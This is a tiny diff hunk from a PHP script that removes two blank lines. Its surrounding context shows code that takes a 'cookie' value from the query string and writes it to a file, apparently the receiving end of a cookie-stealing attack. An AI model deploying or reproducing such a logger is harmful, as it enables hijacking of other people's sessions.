@@ -5,6 +5,4 @@ if(isset($_GET['cookie'])){
     fwrite($f,$cookie);
     fclose($f);
 }
-
-
 ?>
